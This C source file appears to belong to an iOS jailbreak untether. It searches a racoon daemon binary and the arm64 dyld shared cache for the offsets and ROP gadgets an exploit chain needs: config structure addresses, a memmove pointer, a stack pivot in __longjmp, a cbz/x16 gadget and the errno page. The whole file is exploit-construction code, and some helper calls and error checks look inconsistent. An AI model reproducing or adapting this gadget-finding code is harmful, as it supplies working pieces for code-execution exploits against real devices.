#include <stdio.h>
#include <stdbool.h> // bool
#include <sys/mman.h> // mmap
#include <sys/stat.h> // stat
#include <fcntl.h> // open
#include <stdlib.h> // exit
#include <string.h> // strlen

#include "untether/a64.h"
#include "./shared/realsym.h"

#ifdef ULAND_OFFSETFINDER
#   define LOG(str, args...) do { NSLog(@ str "\n", ##args); } while(0)
#endif

void * find_data_raw(void * bin, size_t bin_size, void * data, size_t data_size,int search_aligned) {
	char * bin_c = (char *)bin;
	char * data_c = (char *)data;
	if (bin == NULL || data == NULL || data_size == 0) {return NULL;}
	for (size_t i = 0; i < bin_size; i+=search_aligned) {
		if (bin_c[i] == data_c[0]) {
			bool found = true;
			for (size_t data_idx = 0; data_idx < data_size && (i+data_idx) < bin_size; data_idx++) {
				if (bin_c[i+data_idx] != data_c[data_idx]) {
					found = false;
					break;
				}
			}
			if (found && (i+data_size) < bin_size) {
				return (void*)i;
			}
		}
	}
	return NULL;
}

void * find_str(char * str) {
	return find_data(racoon_bin,racoon_bin_size,str,strlen(str));
}

void * find_ref(void * addr) {
	for (size_t i = 0; i < racoon_bin_size; i+=4) {
		adr_t * current_instruction = racoon_bin + i;
		if (is_adr(current_instruction)) {
			uint64_t off = get_adr_off(current_instruction);
			if ((off + i) == (uint64_t)addr) {
				return (void*)i;
			}
		}
		if (is_adrp(current_instruction)) {
			uint64_t off = get_adr_off(current_instruction);
			if ((off + (i & ~0xfff)) == (uint64_t)addr) {
				return (void*)i;
			}
		}
	}
	return NULL;
}

void * find_strref(char * str) {
	void * str_addr = find_str(str);
	return find_ref(str_addr);
}

void * find_code_xref(void * addr) {
	for (size_t i = 0; i < racoon_bin_size; i+=4) {
		void * curr_inst = racoon_bin + i;
		if (is_br(curr_inst) || is_bl(curr_inst) || is_b(curr_inst)) {
			uint64_t off = get_bl_off(curr_inst);
			if ((off + i) == (uint64_t) addr) {
				return (void*)i;
			}
		}
		if (is_b_cond(curr_inst)) {
			uint64_t off = get_b_cond_off(curr_inst);
			if ((off + i) == (uint64_t) addr) {
				return (void*)i;
			}
		}
		if (is_cbz(curr_inst) || is_cbnz(curr_inst)) {
			uint64_t off = get_cbz_off(curr_inst);
			if ((off + i) == (uint64_t) addr) {
				return (void*)i;
			}
		}
	}
	return NULL;
}

void * isakmp_cfg_config_addr() {
	void * error_handling_instruction = find_strref("No more than %d WINS");
	LOG(@"Found error handling stub @ %p\n",error_handling_instruction);
	for (void * i = error_handling_instruction; i > (error_handling_instruction-20*4); i-=4) {
		void * xref = find_code_xref(i);
		if (xref != 0) {
			LOG(@"Found xref from %p\n",xref);			
			// TODO: check if the instruction is a b.gt
			for (void * backwards_search = xref; backwards_search > (xref-20*4); backwards_search-=4) {
				void * curr_inst = racoon_bin+((size_t)backwards_search);
				if (is_adr(curr_inst)) {
					uint64_t off = get_adr_off(curr_inst);
					return off+backwards_search;
				}
			}
		} 
	}
	return NULL;
}

void * lcconf_addr() {
	void * error_handling_instruction = find_strref("failed to set my ident: %s");
	LOG(@"Found error handling stub @ %p\n",error_handling_instruction);
	for (void * i = error_handling_instruction; i > (error_handling_instruction-20*4); i-=4) {
		void * xref = find_code_xref(i);
		if (xref != 0) {
			LOG(@"Found xref from %p\n",xref);			
			// TODO: check if the instruction is a cbnz
			for (void * backwards_search = xref; backwards_search > (xref-20*4); backwards_search-=4) {
				void * curr_inst = racoon_bin+((size_t)backwards_search);
				if (is_ldr_lit(curr_inst)) {
					uint64_t off = get_ldr_lit_off(curr_inst);
					return off+backwards_search;
				}
			}
		} 
	}
	return NULL;
}

size_t get_cache_maxslide() {
	uint64_t * cache_slide = shared_cache + 30*8;
	return *cache_slide;
}



void * memmove_cache_ptr(char * path) {
	void * strlcpy = (void*)realsym(path,"_strlcpy");	
	if (strlcpy == NULL) {
		LOG(@"Couldn't find strlcpy\n");
		exit(1);
	}
	LOG(@"strlcpy @ %p\n",strlcpy);
	strlcpy -= 0x180000000;
	strlcpy += (size_t)shared_cache;
	bool first = true;
	for (void * curr_instr = strlcpy; curr_instr < (strlcpy+0x4000); curr_instr+=4) {
		if (is_bl(curr_instr)) {
			if (first) {first = false; continue;} // skip first bl
			void * loader_stub = (void*)(get_bl_off(curr_instr) + (size_t)curr_instr);
			if (!is_adrp(loader_stub)) {return NULL;} // should be there
			void * memmove_ptr = (void*)(get_adr_off(loader_stub)+((size_t)curr_instr & ~0xfff));
			loader_stub += 4; // next instruction
			if (!is_ldr_imm_uoff(loader_stub)) {return NULL;} // should be there
			memmove_ptr += get_ldr_imm_uoff(loader_stub)-(size_t)shared_cache;
			return memmove_ptr;
		}
	}

	return NULL;
}

void * get_stackpivot_addr(char * path) {
	void * longjmp = (void*)realsym(path,"__longjmp");
	if (longjmp == NULL) {
		LOG(@"longjmp wasn't found\n");
		exit(1);
	}
	LOG(@"longjmp is @ %p\n",longjmp);
	longjmp -= 0x180000000;
	longjmp += (size_t)shared_cache;
	for (void * curr_instr = longjmp; curr_instr < (longjmp+0x4000); curr_instr+=4) {
		if (is_add_imm(curr_instr)) { // mov sp, x2 is acc add sp, x2, 0
			return curr_instr-(size_t)shared_cache;
		}
	}
	return NULL;
}

void * get_cbz_x0_gadget() {
	for (size_t i = 0; i < shared_cache_size; i+=4) {
		void * curr_instr = shared_cache+i;
		if (is_cbz(curr_instr) && get_cbz_off(curr_instr) == 8 && is_ret(curr_instr+8) && is_b(curr_instr+4)) {
			int64_t bl_off = get_bl_off(curr_instr+4);
			void * stub_instr = curr_instr+4+bl_off;
			if (!is_adrp(stub_instr)) {continue;}
			if (!is_ldr_imm_uoff(stub_instr+4)) {continue;}
			return curr_instr-(size_t)shared_cache;
		}
	}
	return NULL;
}

void * get_cbz_x0_x16_load(void * cbz_x0_gadget_addr) {
	cbz_x0_gadget_addr += (size_t)shared_cache;
	if (is_cbz(cbz_x0_gadget_addr) && get_cbz_off(cbz_x0_gadget_addr) == 8 && is_ret(cbz_x0_gadget_addr+8) && is_b(cbz_x0_gadget_addr+4)) {
    	int64_t bl_off = get_bl_off(cbz_x0_gadget_addr+4);
    	void * stub_instr = cbz_x0_gadget_addr+4+bl_off;
    	if (!is_adrp(stub_instr)) {return NULL;}
    	if (!is_ldr_imm_uoff(stub_instr+4)) {return NULL;}
		return (void*)((((size_t)stub_instr & ~0xfff)+get_adr_off(stub_instr)+get_ldr_imm_uoff(stub_instr+4)) - (size_t)shared_cache);
    }
	return NULL;
}


// This returns the page the errno stuff is on, we only need that information and it's way easier to parse
void * get_errno_offset(char * path) {
	void * __mmap = (void*)realsym(path,"___mmap");
	if (__mmap == NULL) {
		LOG(@"mmap wasn't found\n");
		exit(1);
	}
	LOG(@"mmap is @ %p\n",__mmap);
	__mmap -= 0x180000000;
	__mmap += (size_t)shared_cache;
	for (void * curr_instr = __mmap; curr_instr < (__mmap+40*4);curr_instr+=4) {
		if (is_bl(curr_instr)) {
			void * errno_stub = curr_instr + get_bl_off(curr_instr);
			if (!is_adrp(errno_stub)) {continue;}
			return (void*)((((size_t)errno_stub & ~0xfff)+get_adr_off(errno_stub)) - (size_t)shared_cache);
		}
	}
	return NULL;
}

/*
void * get_mach_msg_offset(char * path) {
	void * mach_msg_addr = (void*)realsym(path,"_mach_msg");
	if (mach_msg_addr == NULL) {
		LOG(@"mach_msg wasn't found\n");
		exit(1);
	}
	LOG(@"mach_msg is @ %p\n",mach_msg_addr);
	return NULL;
}
*/


void init_uland_offsetfinder(char * racoon_bin, char * cache) {
	int fd = open("./racoon_test_bin_11.3.1_iPAD_5,1",O_RDONLY);
    if (fd < 0) {
    	LOG(@"Couldn't open file\n");
    	exit(1);
    }
    struct stat tmp;
    if(fstat(fd,&tmp)) {
    	LOG(@"fstat failed\n");
    	exit(1);
    }
    racoon_bin_size = tmp.st_size;
    racoon_bin = mmap(0,(tmp.st_size & ~0x3fff) + 0x4000, PROT_READ, MAP_FILE | MAP_PRIVATE, fd, 0);
    if (racoon_bin == NULL) {
    	LOG(@"mmap failed\n");
    }
    fd = open("./dyld_shared_cache_arm64",O_RDONLY);
    if (fd < 0) {
    	LOG(@"Couldn't load cache\n");
    	exit(1);
    }
    if(fstat(fd,&tmp)) {
    	LOG(@"fstat failed\n");
    	exit(1);
    }
    shared_cache_size = tmp.st_size;
    shared_cache = mmap(0,tmp.st_size, PROT_READ, MAP_FILE | MAP_PRIVATE, fd, 0);
    if (shared_cache == NULL) {
    	LOG(@"mmap failed\n");
    }
}

#ifdef ULAND_OFFSETFINDER
int main() {
	int fd = open("./racoon_test_bin_11.3.1_iPAD_5,1",O_RDONLY);
	if (fd < 0) {
		LOG(@"Couldn't open file\n");
		exit(1);
	}
	struct stat tmp;
	if(fstat(fd,&tmp)) {
		LOG(@"fstat failed\n");
		exit(1);
	}
	racoon_bin_size = tmp.st_size;
	racoon_bin = mmap(0,(tmp.st_size & ~0x3fff) + 0x4000, PROT_READ, MAP_FILE | MAP_PRIVATE, fd, 0);
	if (racoon_bin == NULL) {
		LOG(@"mmap failed\n");
	}
	fd = open("./dyld_shared_cache_arm64",O_RDONLY);
	if (fd < 0) {
		LOG(@"Couldn't load cache\n");
		exit(1);
	}
	if(fstat(fd,&tmp)) {
		LOG(@"fstat failed\n");
		exit(1);
	}
	shared_cache_size = tmp.st_size;
	shared_cache = mmap(0,tmp.st_size, PROT_READ, MAP_FILE | MAP_PRIVATE, fd, 0);
	if (shared_cache == NULL) {
		LOG(@"mmap failed\n");
	}
	LOG(@"String at: %p\n", find_data(racoon_bin,tmp.st_size,"No more than %d WINS",strlen("No more than %d WINS")));
	LOG(@"String at: %p\n", find_str("No more than %d WINS"));
	LOG(@"Ref to str: %p\n", find_strref("No more than %d WINS"));
	LOG(@"isakmp_cfg_config is @ %p\n",isakmp_cfg_config_addr());
	LOG(@"lcconf_addr is @ %p\n",lcconf_addr());
	LOG(@"max slide is 0x%zx\n",get_cache_maxslide());
	LOG(@"memmove_cache_ptr is @ %p\n",memmove_cache_ptr("./dyld_shared_cache_arm64"));
	LOG(@"stackpivot is @ %p\n",get_stackpivot_addr("./dyld_shared_cache_arm64"));
	LOG(@"cbz_gadget is @ %p\n",get_cbz_x0_gadget());
	LOG(@"cbz_gadget_x16_load is @ %p\n",get_cbz_x0_x16_load(get_cbz_x0_gadget()));
	LOG(@"errno_offset is @ %p\n",get_errno_offset("./dyld_shared_cache_arm64"));
	//LOG(@"mach_msg_offset is @ %p\n",get_mach_msg_offset("./dyld_shared_cache_arm64"));
}
#endif
